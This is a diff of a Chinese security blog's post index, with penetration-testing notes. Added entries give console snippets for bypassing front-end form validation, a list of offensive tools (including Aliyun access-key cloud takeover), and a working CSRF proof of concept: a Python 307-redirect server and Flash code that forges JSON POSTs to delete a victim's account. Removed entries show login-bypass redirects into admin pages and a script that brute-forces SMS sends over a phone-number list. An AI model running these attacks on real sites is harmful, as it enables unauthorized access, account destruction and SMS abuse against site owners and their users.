-<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern_groups = &#123;</span><br><span class="line">    <span class="string">&quot;PagePath Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;pagePath:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;pagePath:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;pagePath_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;Path Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;path:\s*&quot;(.*?)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;path:\s*&#x27;(.*?)&#x27;&quot;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url:\s*&quot;([^&quot;]+)&quot;&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;url: &quot;([^&quot;]+)&#x27;</span>), <span class="string">&quot;path_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;GET Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;get\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;get\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;get_double_quotes&quot;</span>),</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;POST Matches&quot;</span>: [</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&#x27;post\([^()]*?&quot;([^&quot;]*?)&quot;[^()]*?\)&#x27;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">        (re.<span class="built_in">compile</span>(<span class="string">r&quot;POST\([^()]*?[&#x27;\&quot;]([^&#x27;\&quot;]*?)[&#x27;\&quot;][^()]*?\)&quot;</span>), <span class="string">&quot;post_double_quotes&quot;</span>),</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过前端认证提交表单的方法：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一</span></span><br><span class="line">如果表单有 id 或 name，可以直接提交：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">submit</span>();  <span class="comment">// 直接提交，不触发前端验证</span></span><br><span class="line"></span><br><span class="line">如果不知道 form 的选择器，可以：</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();  <span class="comment">// 提交页面第一个表单</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line">如果输入框有 required 属性，可以移除它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>).<span class="title function_">removeAttribute</span>(<span class="string">&#x27;required&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法三：</span></span><br><span class="line">在 &lt;form&gt; 上设置 novalidate 可以禁用 <span class="title class_">HTML5</span> 表单验证：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">setAttribute</span>(<span class="string">&#x27;novalidate&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法四：</span></span><br><span class="line">如果按钮有 onclick 事件阻止提交，可以覆盖它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="property">onclick</span> = <span class="literal">null</span>;</span><br><span class="line">然后手动触发点击：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="title function_">click</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法五：</span></span><br><span class="line">直接构造api：</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/submit-url&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">field1</span>: <span class="string">&quot;value1&quot;</span>,</span><br><span class="line">    <span class="attr">field2</span>: <span class="string">&quot;value2&quot;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>project</tag>
+        <tag>console</tag>
       </tags>
   </entry>
   <entry>
@@ -203,65 +235,6 @@
       </categories>
       <tags>
         <tag>payload</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>主页和api</title>
-    <url>/2024/12/26/%E4%B8%BB%E9%A1%B5%E5%92%8Capi/</url>
-    <content><![CDATA[<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>在工作期间所遇到的小程序和web端所用的方式如下：</p>
-<p>1、主页由其子域名显示，其他功能显示皆由该子域名指向，xxx#&#x2F;page&#x2F;xxx</p>
-<p>2、其信息由专门的api子域名来传回，有时会有sms子域名用作短信的发送</p>
-<p>3、若没有登录，部分功能的显示可以显示，但无实际信息，即，空白，json为{}</p>
-<span id="more"></span>
-
-<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>1.页面和小程序反编译爬取出的js文件或者json文件通常会有上述两个子域名的指向&#x2F;接口</p>
-<p>2.找到指向&#x2F;接口，能够查看页面的功能以及接口的作用，用作于测试接口</p>
-<p>3.通常会有登录接口用作返回token，大概率为jwt</p>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1.有些网址不登录，后台的接口，以及其他的接口无法查看，只能看到个登录接口，即后续网址接口信息需要后台返回，但不代表不存在，通常即使是一个服务器其功能和作用都会十分广泛，毕竟好的服务器很贵的。</p>
-<p>—&gt;所以可以从多方入手，例如：该子域名的其他小程序，该接口子域名是否存在被其他网址或小程序被调用的可能</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.web需要登录就找它对应的小程序，一般来说小程序一旦授权就会给合法jwt</p>
-<p>2.用jwt深度爬取js，就是哪里能点点哪里，都点一遍，然后把js脚本下下来，分析指向#&#x2F;xxx&#x2F;和api</p>
-<p>3.看有无越权，逻辑漏洞，版本泄露，路径泄露和框架泄露等等</p>
-<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>认真分析一个事物就会形成一条思路明显的线路，整体的框架和内容就会完整，认真很久了还没思路那就去睡觉</p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>api</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息搜集思路</title>
-    <url>/2024/12/20/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<h1 id="信息搜集思路扩散"><a href="#信息搜集思路扩散" class="headerlink" title="信息搜集思路扩散"></a>信息搜集思路扩散</h1><p>​	1.ico图标搜集</p>
-<p>​	2.icp备案号&#x2F;icp.name备案公司搜集</p>
-<p>​	3.域名搜集———简写域名搜集&#x2F;子域名搜集</p>
-<span id="more"></span>
-
-<p>​	4.关键字搜寻-title&#x2F;body</p>
-<p>​	5.中标公司，名下公司查询—涉及就查</p>
-<p>​	6.证书查询</p>
-<p>​	7.图片搜索—基本没用</p>
-<p>​		1&gt;联合&#x2F;递归查询</p>
-<p>​		2&gt;爆破域名查询——-针对空间测绘找不到的影子资产</p>
-<p>​		3&gt;域名目录更改—–例如，ab.sb.com——&gt;ab.sb.com&#x2F;ab          目录爆破**</p>
-<h1 id="找网址漏洞的信息搜集思路"><a href="#找网址漏洞的信息搜集思路" class="headerlink" title="找网址漏洞的信息搜集思路"></a>找网址漏洞的信息搜集思路</h1><p>​	1.要是信息搜集能力强于web渗透思路如下</p>
-<p>​		1&gt;与其在网址上找漏洞不如，根据漏洞找对应网址</p>
-<p>​	2.web渗透强于其他</p>
-<p>​		2&gt;搜集边缘&#x2F;影子资产，从易到难</p>
-<h1 id="根据公众号找web的思路"><a href="#根据公众号找web的思路" class="headerlink" title="根据公众号找web的思路"></a>根据公众号找web的思路</h1><p>​	1.找合作公司的公众号，找相关的功能web</p>
-<p>​	2.找到公众号所有的web，根据域名找公司，根据公司找公众号，以此往复***</p>
-<p>​	3.根据全称公众号，找下面的无关公众号点点，可能存在你要找的内容功能</p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>Information</tag>
-        <tag>Official account</tag>
       </tags>
   </entry>
   <entry>
@@ -522,76 +495,6 @@
       </tags>
   </entry>
   <entry>
-    <title>前端游走</title>
-    <url>/2025/03/04/%E5%89%8D%E7%AB%AF%E6%B8%B8%E8%B5%B0/</url>
-    <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
-<p>我主要使用的方法是其中的 <a href="https://github.com/jxhczhl/JsRpc">JsRpc</a>  +  python</p>
-<h3 id="1-找明码函数"><a href="#1-找明码函数" class="headerlink" title="[1]找明码函数"></a>[1]找明码函数</h3><p>找到其中明码所代表的变量，一般查找方式为查找关键字：<strong>encrypt</strong> ，来找到明码加密的函数</p>
-<h3 id="2-连rpc-设断点"><a href="#2-连rpc-设断点" class="headerlink" title="[2]连rpc-设断点"></a>[2]连rpc-设断点</h3><p>连接jsrpc，设置断点，设置全局变量，设置demo变量，设置demo变量的功能</p>
-<span id="more"></span>
-
-<p>连接–&gt;<a href="https://github.com/cliayn/cliayn.github.io/blob/master/image/web-js-freely/1.txt">连接函数</a>，断点自己找明文就行</p>
-<p><img src="/../image/web-js-freely/1.png" alt="该图取自先知社区"></p>
-<p>全局变量如下，例如加密函数a(t)，t是明码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.enc=a</span><br><span class="line">//如果复杂则用下面的</span><br><span class="line"></span><br><span class="line">window.enc=function()&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>
-
-<p>设置demo变量如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>设置demo变量的功能：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve, param) &#123;</span><br><span class="line">    var res = enc(String(param));</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里是传多个参数</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve,param) &#123;</span><br><span class="line">    //这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span><br><span class="line">    res=hlg(param[&quot;user&quot;],param[&quot;status&quot;])</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-
-<p><strong>！！！</strong>值得注意的是：</p>
-<p>​	<strong>运行js到断点处执行所有的代码和指令，例如设置全局变量一定要在断点处，否则可能会找不到明码变量</strong></p>
-<h3 id="3-跑py代码"><a href="#3-跑py代码" class="headerlink" title="[3]跑py代码"></a>[3]跑py代码</h3><p>py代码框架大概如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//例如我爆破手机号</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">file_path = &#x27;sampled_100k.txt&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">        for line in file:</span><br><span class="line">            print(line.strip())  # .strip() to remove any extra newline characters</span><br><span class="line">            phone_number = line.strip()</span><br><span class="line">            </span><br><span class="line">            url = f&quot;http://127.0.0.1:12080/go?group=zzz&amp;action=sendSms&amp;param=&#123;phone_number&#125;&quot;</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(f&quot;File &#123;file_path&#125; not found.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><strong>！！！</strong>值得注意的是：</p>
-<p>​	<strong>你定义的window.enc函数的功能决定res.text返回的是什么</strong></p>
-<h1 id="前端穿梭"><a href="#前端穿梭" class="headerlink" title="前端穿梭"></a>前端穿梭</h1><p>如果你因为进入不了后台而找不全接口，或者渗透时js老是强制跳转登录页面，这个可能能帮到你</p>
-<h3 id="1-绕过登录口"><a href="#1-绕过登录口" class="headerlink" title="[1]绕过登录口"></a>[1]绕过登录口</h3><p>提供几个方法以供参考，如果不行还是得审计js文件</p>
-<h5 id="·1-更改响应包"><a href="#·1-更改响应包" class="headerlink" title="·1.更改响应包"></a>·1.更改响应包</h5><p>更改登录接口返回的响应包，将flase改成true，或者code改成200或者0，status改成200或者0，具体数字可能需要审计js代码，看他们js监控的登录成功的响应是什么，一般情况就是200或者0</p>
-<h5 id="·2-控制台强制跳转"><a href="#·2-控制台强制跳转" class="headerlink" title="·2.控制台强制跳转"></a>·2.控制台强制跳转</h5><p>这个比较万金油，在控制台输入如下指令，如果用不了你就得看js文件—看下方注意事项</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//引号后面加要跳转的目录</span><br><span class="line">window.location.href = &quot;/mch/info_basic/&quot;;</span><br><span class="line"></span><br><span class="line">//不行可以用这个</span><br><span class="line"></span><br><span class="line">location.hash = &#x27;/user/admin&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>如果你看到闪现了一下后台的页面就代表他们是把后台页面也放到了前端了的，有两种情况</p>
-<p>1&gt;跳转后可能在控制台会报错，点击报错的js位置进行断点，然后再输入一次控制台指令，当然，你直接在url输入也一样，就可以卡到js加载的后端</p>
-<p><img src="/../image/web-js-freely/test2.jpg"></p>
-<p>2&gt;跳转后无异常，又有两种情况解决</p>
-<p>​	—你需要多找几个断点，直到找到控制台输入指令可以调试的那个断点，一直调试下一步，直到有后台页面</p>
-<p>​	—控制台输入代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.onbeforeunload = function() &#123;</span><br><span class="line">    return &quot;你确定要离开吗？&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//然后再输入</span><br><span class="line">location.hash = &#x27;/admin/xxxx&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>​			一般来说，就会跳转到第一种情况，当然，具体情况还得看js咋写的</p>
-<p><img src="/../image/web-js-freely/test1.jpg"></p>
-<p>跳转到后台页面后一般是不能点击里面的链接的，这个时候要跳到f12的网络功能或者打开burp拦截包，将返回”Unauthorized”或者相关的都禁用或者拦截，禁用完之后，再运行一次控制台指令就不会强制跳转了</p>
-<p><img src="/../image/web-js-freely/3.png"></p>
-<p>！！！值得注意的是：</p>
-<p>1&gt;<strong>记得提前删除网络日历，要不然太多了影响判断</strong></p>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<blockquote>
-<p>2&gt;<strong>一般看js文件中用的是什么强制跳转的函数，js用什么你就用什么，例如这个就要用location.hash&#x3D;”(后台目录)”</strong></p>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
-</blockquote>
-<p><img src="/../image/web-js-freely/2.jpg"></p>
-<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;无需多言，看得懂，会改，哪基本前端就没有什么秘密了</p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>web-net</tag>
-        <tag>js</tag>
-        <tag>key</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>命令的熟悉</title>
     <url>/2025/04/23/%E5%91%BD%E4%BB%A4%E7%9A%84%E7%86%9F%E6%82%89/</url>
     <content><![CDATA[<h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><p>nc、ls、待补充</p>
@@ -719,6 +622,74 @@
       </tags>
   </entry>
   <entry>
+    <title>渗透工具&amp;项目推荐</title>
+    <url>/2025/04/23/%E9%A1%B9%E7%9B%AE&amp;%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/</url>
+    <content><![CDATA[<h1 id="GitHub项目："><a href="#GitHub项目：" class="headerlink" title="GitHub项目："></a>GitHub项目：</h1><p><strong>看目录查找，内容未制表</strong></p>
+<span id="more"></span>
+
+<h3 id="内网："><a href="#内网：" class="headerlink" title="内网："></a>内网：</h3><h5 id="内存码注入"><a href="#内存码注入" class="headerlink" title="内存码注入"></a>内存码注入</h5><h6 id="pap1rman"><a href="#pap1rman" class="headerlink" title="pap1rman"></a><a href="https://github.com/pap1rman/JNDIExploit-modify/commits?author=pap1rman">pap1rman</a></h6><h3 id="bp插件："><a href="#bp插件：" class="headerlink" title="bp插件："></a>bp插件：</h3><h5 id="爆破类"><a href="#爆破类" class="headerlink" title="爆破类"></a>爆破类</h5><h6 id="Hannah-PortSwigger"><a href="#Hannah-PortSwigger" class="headerlink" title="Hannah-PortSwigger"></a><a href="https://github.com/PortSwigger/turbo-intruder/commits?author=Hannah-PortSwigger">Hannah-PortSwigger</a></h6><h5 id="伪造类"><a href="#伪造类" class="headerlink" title="伪造类"></a>伪造类</h5><h6 id="隐藏bp的指纹特征"><a href="#隐藏bp的指纹特征" class="headerlink" title="隐藏bp的指纹特征"></a><a href="https://github.com/sleeyax/burp-awesome-tls">隐藏bp的指纹特征</a></h6><h6 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a><a href="https://github.com/TheKingOfDuck/burpFakeIP">伪造ip</a></h6><h3 id="探测漏洞："><a href="#探测漏洞：" class="headerlink" title="探测漏洞："></a>探测漏洞：</h3><h5 id="开源漏扫"><a href="#开源漏扫" class="headerlink" title="开源漏扫"></a>开源漏扫</h5><h6 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a><a href="https://github.com/zan8in/afrog">afrog</a></h6><h6 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">nuclei</a></h6><h6 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a><a href="https://github.com/SleepingBag945/dddd">dddd</a></h6><h5 id="框架-服务漏洞"><a href="#框架-服务漏洞" class="headerlink" title="框架&amp;服务漏洞"></a>框架&amp;服务漏洞</h5><h6 id="nacos-p-8848"><a href="#nacos-p-8848" class="headerlink" title="nacos-p-8848"></a><a href="https://github.com/Pizz33/nacos_vul">nacos-p-8848</a></h6><h6 id="winrm-p-5985"><a href="#winrm-p-5985" class="headerlink" title="winrm-p-5985 "></a><a href="https://github.com/Hackplayers/evil-winrm/commits?author=OscarAkaElvis">winrm-p-5985 </a></h6><h3 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h3><h5 id="存活检测"><a href="#存活检测" class="headerlink" title="存活检测"></a>存活检测</h5><h6 id="存活检测-httpx"><a href="#存活检测-httpx" class="headerlink" title="存活检测-httpx"></a><a href="https://github.com/projectdiscovery/httpx/commits?author=dogancanbakir">存活检测-httpx</a></h6><h3 id="云服务器漏洞排查"><a href="#云服务器漏洞排查" class="headerlink" title="云服务器漏洞排查"></a>云服务器漏洞排查</h3><h5 id="条件命令执行"><a href="#条件命令执行" class="headerlink" title="条件命令执行"></a>条件命令执行</h5><!--获取`accesskeyid`和`accesskeysecrets`后可使用工具接管云-->
+
+<h6 id="teamssix"><a href="#teamssix" class="headerlink" title="teamssix"></a><a href="https://github.com/teamssix/teamssix">teamssix</a></h6><h6 id="aliyun-accesskey-Tools"><a href="#aliyun-accesskey-Tools" class="headerlink" title="aliyun-accesskey-Tools"></a><a href="https://github.com/mrknow001/aliyun-accesskey-Tools">aliyun-accesskey-Tools</a></h6><h1 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h1><h5 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h5><h6 id="openvpn—统一网"><a href="#openvpn—统一网" class="headerlink" title="openvpn—统一网"></a>openvpn—统一网</h6><h6 id="SocksCap645—管理-强制代理"><a href="#SocksCap645—管理-强制代理" class="headerlink" title="SocksCap645—管理&amp;强制代理"></a>SocksCap645—管理&amp;强制代理</h6><h6 id="Proxifier—强制代理"><a href="#Proxifier—强制代理" class="headerlink" title="Proxifier—强制代理"></a>Proxifier—强制代理</h6><h6 id="Fiddler-Classic—强制代理【渗透工具】"><a href="#Fiddler-Classic—强制代理【渗透工具】" class="headerlink" title="Fiddler Classic—强制代理【渗透工具】"></a>Fiddler Classic—强制代理【渗透工具】</h6><h6 id="Charles—强制代理【渗透工具】"><a href="#Charles—强制代理【渗透工具】" class="headerlink" title="Charles—强制代理【渗透工具】"></a>Charles—强制代理【渗透工具】</h6>]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>project</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CSRF记录</title>
+    <url>/2025/04/17/CSRF%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="笔记-CSRF-极简分类"><a href="#笔记-CSRF-极简分类" class="headerlink" title="笔记-CSRF-极简分类"></a>笔记-CSRF-极简分类</h1><p>1-简单</p>
+<p>get+post_forms</p>
+<p>只接受三种类型，text&#x2F;plain、urlendocde、忘了</p>
+<p>2-中等</p>
+<p>限定type，例如最典型的：post-json</p>
+<p>可以尝试几种常见方式 js、flash307、WebSocket、http请求走私等</p>
+<p>*浏览器或者所在浏览的平台安全策略严谨的话建议当它没有csrf</p>
+<p>3-安全</p>
+<p>安全，以目前技术没希望的，或者只能</p>
+<p>钓鱼、xss、cors等联合漏洞实现的</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="flash方法"><a href="#flash方法" class="headerlink" title="flash方法"></a>flash方法</h2><p>若是服务器只校验post+content-type：json且存在请求体，八成相当于没有csrf</p>
+<p>利用难点：	打开网址A的时候打开网址B</p>
+<p>​			若是网址接收option也可以直接用js操作</p>
+<p>​			服务器对发送种类限制，例如：json</p>
+<p>正常来说没人管这个csrf，毕竟要联合xss或者其他反射的漏洞才能造成较大危害</p>
+<p>可以用（CSRF + Flash + HTTP 307）继续绕过服务器对发送种类限制，例如：json</p>
+<h2 id="绕过json项目："><a href="#绕过json项目：" class="headerlink" title="绕过json项目："></a>绕过json项目：</h2><p><a href="https://github.com/appsecco/json-flash-csrf-poc">json-flash-csrf-poc</a></p>
+<p>*注意：需要用户浏览器启用 Flash</p>
+<p>​    	*<strong>浏览器实现可能不同</strong>  所以 <strong>307 重定向默认会变成 GET 请求</strong>（即使原请求是 POST）</p>
+<p>需要安装mxmlc命令，flex-config.xml内的playerglobal指向的参数可能要更改，以及32.0&#x2F;43或者27.0&#x2F;38</p>
+<h3 id="PoC工作流程"><a href="#PoC工作流程" class="headerlink" title="PoC工作流程"></a>PoC工作流程</h3><p>下面给出的是攻击的整个过程，其中目标用户的浏览器必须启用Flash：</p>
+<p>\1.   用户在浏览器中登录<a href="http://victim-site/">http://victim-site/</a>。</p>
+<p>\2.   用户被重定向到<a href="http://attacker-ip:8000/csrf.swf">http://attacker-ip:8000/csrf.swf</a>。</p>
+<p>\3.   Flash文件加载成功，并向<a href="http://attacker-ip:8000/">http://attacker-ip:8000/</a>发送带有自定义Header的POST Payload。</p>
+<p>\4.   攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到 <a href="http://victim-site/">http://victim-site/</a>。</p>
+<p>\5.   目标用户刷新自己的 <a href="http://victim-site/">http://victim-site/</a> 页面，并发现自己的帐户已经被删除了。</p>
+<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;&#x27;</span></span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RedirectHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&#x27;/csrf.swf&#x27;</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-shockwave-flash&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;csrf.swf&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(f.read())</span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">307</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_header(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;http://192.168.43.66:5000/api/test&quot;</span>)</span><br><span class="line">        <span class="comment">##该url为希望执行操作的网址</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="variable language_">self</span>.do_POST()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_class = HTTPServer</span><br><span class="line">    httpd = server_class((HOST, PORT), RedirectHandler)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Starts - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s Server Stops - %s:%s&#x27;</span> % (time.asctime(), HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span>, PORT))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">  import flash.display.Sprite;</span><br><span class="line">  import flash.net.URLLoader;</span><br><span class="line">  import flash.net.URLRequest;</span><br><span class="line">  import flash.net.URLRequestHeader;</span><br><span class="line">  import flash.net.URLRequestMethod;</span><br><span class="line">public class csrf extends Sprite</span><br><span class="line">  &#123;</span><br><span class="line">    public function csrf()</span><br><span class="line">    &#123;</span><br><span class="line">      super();</span><br><span class="line">      var member1:Object = null;</span><br><span class="line">      var myJson:String = null;</span><br><span class="line">      member1 = new Object();</span><br><span class="line">      member1 = &#123;</span><br><span class="line">          &quot;acctnum&quot;:&quot;100&quot;,</span><br><span class="line">          &quot;confirm&quot;:&quot;true&quot;</span><br><span class="line">      &#125;;</span><br><span class="line">      var myData:Object = member1;</span><br><span class="line">      myJson = JSON.stringify(myData);</span><br><span class="line">      var url:String = &quot;http://127.0.0.1:8000&quot;;</span><br><span class="line">      ##该ip为攻击者服务器</span><br><span class="line">      var request:URLRequest = new URLRequest(url);</span><br><span class="line">      request.requestHeaders.push(new URLRequestHeader(&quot;Content-Type&quot;,&quot;application/json&quot;));</span><br><span class="line">      request.data = myJson;</span><br><span class="line">      request.method = URLRequestMethod.POST;</span><br><span class="line">      var urlLoader:URLLoader = new URLLoader();</span><br><span class="line">try</span><br><span class="line">      &#123;</span><br><span class="line">          urlLoader.load(request);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">      catch(e:Error)</span><br><span class="line">      &#123;</span><br><span class="line">          trace(e);</span><br><span class="line">          return;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 